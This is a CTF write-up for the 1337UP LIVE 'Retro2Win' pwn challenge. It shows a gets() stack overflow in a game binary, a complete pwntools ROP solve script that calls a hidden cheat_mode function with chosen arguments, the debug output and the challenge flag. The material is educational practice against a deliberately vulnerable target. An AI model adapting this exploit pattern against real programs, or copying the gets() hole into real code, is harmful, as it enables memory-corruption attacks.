---
title: "Retro2Win - 1337UP LIVE CTF"
category: "pwn"
subcategory: "stack"
type: "writeup"
tags: ["pwn", "buffer-overflow", "rop", "ret2win", "canary", "pie", "pwntools", "pwndbg", "checksec", "gets", "stack", "1337up-live-ctf", "ctf-writeup"]
summary: "I'm going to skip over some of the steps, because I cover in more detail in the video walkthrough and the approach is the same as Rigged Slot Machine (disassemble, find offset etc)."
source:
  name: "CTFtime writeup #39686"
  url: "https://ctftime.org/writeup/39686"
original_source: "https://cryptocat.me/blog/ctf/2024/intigriti/pwn/rigged_slot_machine2/"
ctf:
  name: "1337UP LIVE CTF"
  challenge: "Retro2Win"
---

## Metadata

- **CTF:** 1337UP LIVE CTF
- **Task:** Retro2Win
- **Author team:** CryptoCat
- **CTFtime:** <https://ctftime.org/writeup/39686>
- **Original writeup:** <https://cryptocat.me/blog/ctf/2024/intigriti/pwn/rigged_slot_machine2/>

---
I'm going to skip over some of the steps, because I cover in more detail in the video walkthrough and the approach is the same as `Rigged Slot Machine` (disassemble, find offset etc).

Anyway, the binary has no canaries and PIE is disabled.

```bash  
checksec --file retro2win  
[*] '/home/crystal/Desktop/challs/pwn/Retro2Win/solution/retro2win'  
Arch: amd64-64-little  
RELRO: Partial RELRO  
Stack: No canary found  
NX: NX enabled  
PIE: No PIE (0x400000)  
```

Here's what the functionality looks like.

```bash  
nc localhost 1338  
*****************************  
* Retro2Win Game *  
*****************************  
1\. Explore the Forest  
2\. Battle the Dragon  
3\. Quit

Select an option:  
1  
You are walking through a dark forest...  
I don't think there's any flags around here...

*****************************  
* Retro2Win Game *  
*****************************  
1\. Explore the Forest  
2\. Battle the Dragon  
3\. Quit

Select an option:  
2  
You encounter a ferocious dragon!  
But it's too strong for you...  
Only if you had some kind of cheat...

*****************************  
* Retro2Win Game *  
*****************************  
1\. Explore the Forest  
2\. Battle the Dragon  
3\. Quit

Select an option:  
3  
Quitting game...  
```

Nothing! If we disassemble the code, we will find a hidden menu option `1337`.

```bash  
nc localhost 1338  
*****************************  
* Retro2Win Game *  
*****************************  
1\. Explore the Forest  
2\. Battle the Dragon  
3\. Quit

Select an option:  
1337  
Enter your cheatcode:  
1337  
Checking cheatcode: 1337!  
*****************************  
* Retro2Win Game *  
*****************************  
1\. Explore the Forest  
2\. Battle the Dragon  
3\. Quit  
```

Nothing will work though, that's because the `enter_cheatcode()` function looks like this.

```c  
void enter_cheatcode()  
{  
char code[16];

printf("Enter your cheatcode:\n");  
gets(code);  
printf("Checking cheatcode: %s!\n", code);  
}  
```

Spot the buffer overflow? Yes, but no flag. Check out this other `cheat_mode` function though.

```c  
void cheat_mode(long key1, long key2)  
{  
if (key1 == 0x2323232323232323 && key2 == 0x4242424242424242)  
{  
printf("CHEAT MODE ACTIVATED!\n");  
printf("You now have access to secret developer tools...\n\n");

FILE *file = fopen("flag.txt", "r");  
if (file == NULL)  
{  
printf("Error: Could not open flag.txt\n");  
return;  
}  
char flag[64];  
if (fgets(flag, sizeof(flag), file) != NULL)  
{  
printf("FLAG: %s\n", flag);  
}  
fclose(file);  
}  
else  
{  
printf("Unauthorized access detected! Returning to main menu...\n\n");  
}  
}  
```

There are no execution paths to this function, so we need to exploit the buffer overflow to redirect the program execution. However, we also need to ensure the correct `key1` and `key2` are provided. Essentially, we have a `ret2win` challenge with parameters. Here's a solve script I put together.

### [solve.py](http://solve.py)

```python  
from pwn import *

def start(argv=[], *a, **kw):  
if args.GDB: # Set GDBscript below  
return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)  
elif args.REMOTE: # ('server', 'port')  
return remote(sys.argv[1], sys.argv[2], *a, **kw)  
else: # Run locally  
return process([exe] + argv, *a, **kw)

def find_ip(payload):  
# Launch process and navigate to the cheat code entry  
p = process(exe)  
p.sendlineafter(b'Select an option:', b'1337')  
p.sendlineafter(b'cheatcode:', payload)  
# Wait for the process to crash  
p.wait()  
# Print out the address of EIP/RIP at the time of crashing  
ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4)) # x64  
info('Located EIP/RIP offset at {a}'.format(a=ip_offset))  
return ip_offset

# Specify your GDB script here for debugging  
gdbscript = '''  
init-pwndbg  
continue  
'''.format(**locals())

# Set up pwntools for the correct architecture  
exe = './retro2win'  
elf = context.binary = ELF(exe, checksec=False)  
context.log_level = 'debug'

# ===========================================================  
# EXPLOIT GOES HERE  
# ===========================================================

# Pass in pattern_size, get back EIP/RIP offset  
offset = find_ip(cyclic(64))

# Start program  
io = start()

# Navigate through the menu to reach the cheat code entry  
io.sendlineafter(b'Select an option:', b'1337') # Enter hidden option

# ROP object  
rop = ROP(elf)  
rop.cheat_mode(0x2323232323232323, 0x4242424242424242)

# Build the payload  
payload = flat({  
offset: [rop.chain()]  
})

pprint(rop.dump())

# Send the payload  
io.sendlineafter(b'cheatcode:', payload)

# Get flag  
io.interactive()  
```

For some reason, it only comes through in the debug. Not sure if this is down to my exploit, the config on the server env (maybe the `socat` command in the dockerfile) or the C code itself. I CBA to debug, you'll work it out! ?

```bash  
[+] Opening connection to 127.0.0.1 on port 1338: Done  
[DEBUG] Received 0xa8 bytes:  
b'*****************************\r\n'  
b'* Retro2Win Game *\r\n'  
b'*****************************\r\n'  
b'1. Explore the Forest\r\n'  
b'2. Battle the Dragon\r\n'  
b'3. Quit\r\n'  
b'\r\n'  
b'Select an option:\r\n'  
[DEBUG] Sent 0x5 bytes:  
b'1337\n'  
[*] Loaded 14 cached gadgets for './retro2win'  
('0x0000: 0x4009b3 pop rdi; ret\n'  
'0x0008: 0x2323232323232323 [arg0] rdi = 2531906049332683555\n'  
'0x0010: 0x4009b1 pop rsi; pop r15; ret\n'  
'0x0018: 0x4242424242424242 [arg1] rsi = 4774451407313060418\n'  
"0x0020: b'iaaajaaa' <pad r15>\n"  
'0x0028: 0x400736 cheat_mode')  
[DEBUG] Received 0x6 bytes:  
b'1337\r\n'  
[DEBUG] Received 0x17 bytes:  
b'Enter your cheatcode:\r\n'  
[DEBUG] Sent 0x49 bytes:  
00000000 61 61 61 61 62 61 61 61 63 61 61 61 64 61 61 61 │aaaa│baaa│caaa│daaa│  
00000010 65 61 61 61 66 61 61 61 b3 09 40 00 00 00 00 00 │eaaa│faaa│··@·│····│  
00000020 23 23 23 23 23 23 23 23 b1 09 40 00 00 00 00 00 │####│####│··@·│····│  
00000030 42 42 42 42 42 42 42 42 69 61 61 61 6a 61 61 61 │BBBB│BBBB│iaaa│jaaa│  
00000040 36 07 40 00 00 00 00 00 0a │6·@·│····│·│  
00000049  
[*] Switching to interactive mode

[DEBUG] Received 0xf3 bytes:  
00000000 61 61 61 61 62 61 61 61 63 61 61 61 64 61 61 61 │aaaa│baaa│caaa│daaa│  
00000010 65 61 61 61 66 61 61 61 b3 09 40 5e 40 5e 40 5e │eaaa│faaa│··@^│@^@^│  
00000020 40 5e 40 5e 40 23 23 23 23 23 23 23 23 b1 09 40 │@^@^│@###│####│#··@│  
00000030 5e 40 5e 40 5e 40 5e 40 5e 40 42 42 42 42 42 42 │^@^@│^@^@│^@BB│BBBB│  
00000040 42 42 69 61 61 61 6a 61 61 61 36 5e 47 40 5e 40 │BBia│aaja│aa6^│G@^@│  
00000050 5e 40 5e 40 5e 40 5e 40 0d 0a 43 68 65 63 6b 69 │^@^@│^@^@│··Ch│ecki│  
00000060 6e 67 20 63 68 65 61 74 63 6f 64 65 3a 20 61 61 │ng c│heat│code│: aa│  
00000070 61 61 62 61 61 61 63 61 61 61 64 61 61 61 65 61 │aaba│aaca│aada│aaea│  
00000080 61 61 66 61 61 61 b3 09 40 21 0d 0a 43 48 45 41 │aafa│aa··│@!··│CHEA│  
00000090 54 20 4d 4f 44 45 20 41 43 54 49 56 41 54 45 44 │T MO│DE A│CTIV│ATED│  
000000a0 21 0d 0a 59 6f 75 20 6e 6f 77 20 68 61 76 65 20 │!··Y│ou n│ow h│ave │  
000000b0 61 63 63 65 73 73 20 74 6f 20 73 65 63 72 65 74 │acce│ss t│o se│cret│  
000000c0 20 64 65 76 65 6c 6f 70 65 72 20 74 6f 6f 6c 73 │ dev│elop│er t│ools│  
000000d0 2e 2e 2e 0d 0a 0d 0a 46 4c 41 47 3a 20 49 4e 54 │...·│···F│LAG:│ INT│  
000000e0 49 47 52 49 54 49 7b 66 61 6b 65 5f 66 6c 61 67 │IGRI│TI{f│ake_│flag│  
000000f0 7d 0d 0a │}··│  
000000f3  
```

Flag: `INTIGRITI{3v3ry_c7f_n33d5_50m3_50r7_0f_r372w1n}`

If you want to learn more about binary exploitation, check out my [beginner series!]([https://www.youtube.com/watch?v=wa3sMSdLyHw&list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94](https://www.youtube.com/watch?v=wa3sMSdLyHw&list=PLHUKi1UlEgOIc07Rfk2Jgb5fZbxDPec94))
